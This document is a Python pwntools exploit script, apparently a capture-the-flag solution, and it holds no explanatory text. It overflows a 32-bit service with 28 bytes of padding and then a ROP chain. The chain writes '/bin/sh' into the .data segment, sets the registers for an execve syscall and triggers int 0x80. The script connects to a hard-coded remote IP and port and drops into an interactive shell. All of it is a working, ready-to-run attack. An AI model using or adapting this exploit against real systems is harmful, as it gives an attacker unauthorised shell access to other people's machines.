from pwn import *
import sys


data_address = 0x080da060
pop_eax_edx_ebx = 0x08056334
mov_memEdx_eax = 0x08056e65
pop_edx_ecx_ebx	= 0x0806ee91
int_0x80 = 0x08049563	


def write_to_data(address, value):
	pl = b''
	pl += p32(pop_eax_edx_ebx)
	pl += value #eax "/bin" , "/sh\x00"
	pl += p32(address) #edx	  address of .data segment
	pl += b'none' #ebx	any value
	pl += p32(mov_memEdx_eax) # move "/bin"to address of .data segment
	return pl



p =remote('45.122.249.68', 10009)
	

payload = b'a'*28
#write /bin/sh to .data segment
payload += write_to_data(data_address, b'/bin')
payload += write_to_data(data_address + 4, b'/sh\x00')
#write 0xb to eax
payload += p32(pop_eax_edx_ebx)
payload += p32(0xb)
payload += p32(0)
payload += p32(0)
#write edx=0,ecx=0,ebx= address of /bin/sh
payload += p32(pop_edx_ecx_ebx)
payload += p32(0)
payload += p32(0)
payload += p32(data_address)

payload += p32(int_0x80)

p.send(payload)
p.interactive()
p.close()
